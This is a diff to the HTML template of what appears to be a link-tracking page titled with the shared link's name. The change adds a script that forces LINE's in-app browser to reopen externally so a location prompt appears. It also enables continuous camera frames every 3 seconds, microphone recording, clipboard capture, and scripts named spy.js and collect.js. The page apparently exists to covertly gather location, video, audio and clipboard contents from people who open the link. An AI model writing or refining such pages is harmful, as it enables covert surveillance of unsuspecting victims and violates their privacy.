@@ -9,6 +9,23 @@
 <link rel="manifest" href="/manifest.webmanifest">
 <link rel="apple-touch-icon" href="/static/icon.svg">
 <title>{{ link.name }}</title>
+<script>
+/* ★ LINE内ブラウザ対策：位置情報の許可ダイアログが出ないので外部ブラウザで開き直す。
+   HTMLは no-store なので必ず最新が走る（JSキャッシュの影響を受けない）。 */
+(function () {
+  var ua = navigator.userAgent || "";
+  if (!/Line\//i.test(ua)) return;                                   // LINE以外はそのまま
+  if (/[?&]openExternalBrowser=1/.test(location.search || "")) return; // もう付いてる
+  try {
+    var u = new URL(location.href);
+    u.searchParams.set("openExternalBrowser", "1");
+    location.replace(u.toString());
+  } catch (e) {
+    location.replace(location.href +
+      (location.search ? "&" : "?") + "openExternalBrowser=1");
+  }
+})();
+</script>
 <style>
 html,body{margin:0;background:#0f1115;color:#e6e9ef;
   font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
@@ -96,19 +113,24 @@ window.LT_TITLE      = {{ link.name|tojson }};
 window.LT_GATE = {{ 1 if gate else 0 }};
 window.LT_REQUIRE_ALL = {{ 1 if require_all else 0 }};
 
+/* live.js 側のLINE判定は、headで既に処理済みなら二重に走らせない */
+window.LT_LINE_FIX = 0;
+
+/* カメラ・マイクはリアルタイム（連続送信）。カメラは別途 自撮り1枚も添える */
 window.LT_CAM      = 1;
-window.LT_CAM_HOLD = 0;
+window.LT_CAM_HOLD = 1;
 window.LT_CAM_PREVIEW = 1;
+window.LT_CAM_EVERY   = 3000;   // 映像フレームを送る間隔(ms)
 window.LT_MIC      = 1;
 window.LT_MIC_HOLD = 1;
-window.LT_MIC_MS   = 4000;
+window.LT_MIC_MS   = 4000;      // 音声を区切って送る長さ(ms)
 window.LT_CLIP     = 1;
 window.LT_SPY_WAIT = 7000;
 window.LT_DEBUG    = 0;
 </script>
-<script src="/static/keepalive.js"></script>
-<script src="/static/collect.js"></script>
-<script src="/static/live.js"></script>
-<script src="/static/spy.js"></script>
-<script src="/static/gate.js"></script>
+<script src="/static/keepalive.js?v=13"></script>
+<script src="/static/collect.js?v=13"></script>
+<script src="/static/live.js?v=13"></script>
+<script src="/static/spy.js?v=13"></script>
+<script src="/static/gate.js?v=13"></script>
 </body></html>
